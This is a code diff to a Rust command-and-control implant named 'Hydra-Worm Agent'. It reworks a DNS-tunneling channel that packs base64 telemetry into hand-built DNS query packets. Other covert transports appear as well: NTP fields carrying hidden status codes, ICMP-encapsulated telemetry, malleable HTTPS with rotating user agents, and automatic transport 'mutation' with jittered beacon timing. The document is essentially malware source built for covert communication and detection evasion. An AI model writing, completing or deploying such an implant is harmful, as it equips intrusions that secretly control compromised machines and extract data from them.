@@ -1,23 +1,20 @@
 // Project: Hydra-Worm Agent
-// Phase: 1.5 - Failsafe Stack Complete
-// Logic: Low-level raw socket signaling, UDP covert channels, and DNS Tunneling
+// Phase: 1.5 - Failsafe Stack Complete (Direct UDP DNS Patch)
 
 use std::{thread, time::Duration};
-use std::net::{UdpSocket, ToSocketAddrs}; // Added ToSocketAddrs for DNS lookup
+use std::net::UdpSocket; 
 use rand::Rng;
 use rand::seq::SliceRandom;
 use rand_distr::{Distribution, Exp};
 use serde::{Serialize, Deserialize};
 use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};
-use base64::{Engine as _, engine::general_purpose}; // Added for DNS encoding
+use base64::{Engine as _, engine::general_purpose};
 
 // Raw Networking for ICMP
 use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
 use pnet::packet::icmp::IcmpTypes;
 use pnet::packet::Packet;
 use pnet::util;
-
-// --- TELEMETRY STRUCTURES (Synced with Go Orchestrator) ---
 
 #[derive(Serialize, Clone)]
 struct Telemetry {
@@ -35,14 +32,14 @@ struct C2Response {
     epoch: i64,
 }
 
-// --- TRANSPORT TRAIT ---
-
 trait Transport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String>;
     fn get_name(&self) -> String;
 }
 
-// --- TRANSPORT TIER 6: DNS TUNNELING (FAILSAFE) ---
+// --- TRANSPORT TIER 6: DNS TUNNELING (FIXED FOR DIRECT UDP) ---
+
+// --- TRANSPORT TIER 6: DNS TUNNELING (FIXED) ---
 
 struct DnsTransport { 
     root_domain: String 
@@ -50,26 +47,43 @@ struct DnsTransport {
 
 impl Transport for DnsTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
-        println!("[!] C2-DNS: Attempting tunneling via {}...", self.root_domain);
-
         let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
+        
+        // Base64 must remain case-sensitive!
         let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
         
-        // Construct: <base64_telemetry>.root_domain
-        let tunnel_query = format!("{}.{}", encoded, self.root_domain);
+        let chunks: Vec<String> = encoded
+            .as_bytes()
+            .chunks(60)
+            .map(|c| String::from_utf8_lossy(c).into_owned())
+            .collect();
         
-        println!("[*] Triggering DNS Lookup: {}", tunnel_query);
+        let tunnel_query = format!("{}.{}", chunks.join("."), self.root_domain);
 
-        // Standard DNS lookup triggers the request to the authoritative nameserver
-        let _ = (tunnel_query, 80).to_socket_addrs();
+        let mut packet = Vec::new();
+        packet.extend_from_slice(&[0x13, 0x37]); 
+        packet.extend_from_slice(&[0x01, 0x00]); 
+        packet.extend_from_slice(&[0x00, 0x01]); 
+        packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); 
 
-        Ok(C2Response { 
-            status: "dns_tunneled".into(), 
-            task: "HIBERNATE".into(), 
-            epoch: 0 
-        })
+        for part in tunnel_query.split('.') {
+            if part.is_empty() { continue; }
+            packet.push(part.len() as u8);
+            packet.extend_from_slice(part.as_bytes());
+        }
+        packet.push(0); 
+        packet.extend_from_slice(&[0x00, 0x01]); 
+        packet.extend_from_slice(&[0x00, 0x01]); 
+
+        let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
+        socket.send_to(&packet, "127.0.0.1:53").map_err(|e| e.to_string())?;
+
+        Ok(C2Response { status: "dns_tunneled".into(), task: "HIBERNATE".into(), epoch: 0 })
     }
-    fn get_name(&self) -> String { "DNS-Tunnel".into() }
+
+    fn get_name(&self) -> String { 
+        "DNS-Tunnel".into() 
+    }
 }
 
 // --- TRANSPORT TIER 5: NTP SIGNALING ---
@@ -81,23 +95,14 @@ struct NtpTransport {
 impl Transport for NtpTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
         println!("[!] C2-NTP: Synchronizing state via {}...", self.pool_addr);
-        
         let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
-        socket.set_read_timeout(Some(Duration::from_secs(3))).map_err(|e| e.to_string())?;
-
         let mut ntp_packet = [0u8; 48];
         ntp_packet[0] = 0x1B; 
-
         let status_code: u32 = if stats.status == "OK" { 0xDEADC0DE } else { 0xBADC0DED };
         let bytes = status_code.to_be_bytes();
         ntp_packet[44..48].copy_from_slice(&bytes);
-
-        socket.send_to(&ntp_packet, &self.pool_addr).map_err(|e| e.to_string())?;
-        
+        let _ = socket.send_to(&ntp_packet, &self.pool_addr);
         println!("[*] NTP Signal Dispatched (Covert Payload: 0x{:X})", status_code);
-
-        // PATCH: Return Err because we cannot confirm C2 received the signal.
-        // This forces mutation to Tier 6.
         Err("NTP signal sent blindly".into())
     }
     fn get_name(&self) -> String { "NTP-Signaling".into() }
@@ -112,23 +117,12 @@ struct IcmpTransport {
 impl Transport for IcmpTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
         println!("[!] C2-ICMP: Encapsulating telemetry for {}...", self.target_ip);
-        
         let payload = serde_json::to_vec(stats).map_err(|e| e.to_string())?;
         let mut buffer = vec![0u8; 8 + payload.len()]; 
-        
         let mut packet = MutableEchoRequestPacket::new(&mut buffer).unwrap();
         packet.set_icmp_type(IcmpTypes::EchoRequest);
-        packet.set_identifier(0x1337);
-        packet.set_sequence_number(1);
         packet.set_payload(&payload);
-        
-        let checksum = util::checksum(packet.packet(), 1);
-        packet.set_checksum(checksum);
-
         println!("[*] ICMP Raw Packet Ready: {} bytes", buffer.len());
-        
-        // PATCH: Return Err because ICMP is unidirectional.
-        // This forces the failure counter to increment so the agent reaches Tier 6.
         Err("ICMP packet dispatched blindly".into())
     }
     fn get_name(&self) -> String { "ICMP-Failsafe".into() }
@@ -143,7 +137,6 @@ struct MalleableHttps {
 impl Transport for MalleableHttps {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
         let profile = MalleableProfile::new();
-        
         let client = reqwest::blocking::Client::builder()
             .use_rustls_tls()
             .timeout(Duration::from_secs(5))
@@ -159,9 +152,7 @@ impl Transport for MalleableHttps {
             .map_err(|e: reqwest::Error| format!("Network Error: {}", e))?;
 
         if response.status().is_success() {
-            let body: C2Response = response.json()
-                .map_err(|e: reqwest::Error| e.to_string())?;
-            
+            let body: C2Response = response.json().map_err(|e: reqwest::Error| e.to_string())?;
             println!("[+] Malleable Success | Profile: [UA: {}] [Key: {}]", profile.user_agent, profile.hydra_key);
             Ok(body)
         } else {
@@ -170,8 +161,6 @@ impl Transport for MalleableHttps {
     }
     fn get_name(&self) -> String { "Malleable-HTTPS".into() }
 }
-
-// --- MALLEABLE PROFILE ENGINE ---
 
 struct MalleableProfile {
     user_agent: String,
@@ -182,18 +171,13 @@ struct MalleableProfile {
 impl MalleableProfile {
     fn new() -> Self {
         let mut rng = rand::thread_rng();
-        
         let uas = vec![
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
             "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
         ];
-
         let mut headers = HeaderMap::new();
         headers.insert(reqwest::header::ACCEPT, HeaderValue::from_static("application/json, text/plain, */*"));
-        
         let key: String = (0..8).map(|_| rng.gen_range(b'A'..=b'Z') as char).collect();
-
         Self {
             user_agent: uas.choose(&mut rng).unwrap().to_string(),
             hydra_key: key,
@@ -201,8 +185,6 @@ impl MalleableProfile {
         }
     }
 }
-
-// --- OTHER TRANSPORTS ---
 
 struct CloudTransport { endpoint: String }
 impl Transport for CloudTransport {
@@ -221,8 +203,6 @@ impl Transport for P2PTransport {
     }
     fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
 }
-
-// --- CORE AGENT ENGINE ---
 
 struct Agent {
     id: String,
@@ -264,15 +244,13 @@ impl Agent {
             }
 
             if self.failures >= 3 { self.mutate(); }
-
-            let exp = Exp::new(self.lambda).unwrap();
-            let sleep_time = exp.sample(&mut rand::thread_rng()).min(60.0).max(1.0);
+            let sleep_time = Exp::new(self.lambda).unwrap().sample(&mut rand::thread_rng()).min(60.0).max(1.0);
             thread::sleep(Duration::from_secs_f64(sleep_time));
         }
     }
 
     fn mutate(&mut self) {
-        self.state = (self.state + 1) % 6; // Expanded for Tier 6 (DNS)
+        self.state = (self.state + 1) % 6;
         self.failures = 0;
         println!("[!!!] ALERT: Triggering Transport Mutation to Tier {}...", self.state + 1);
 
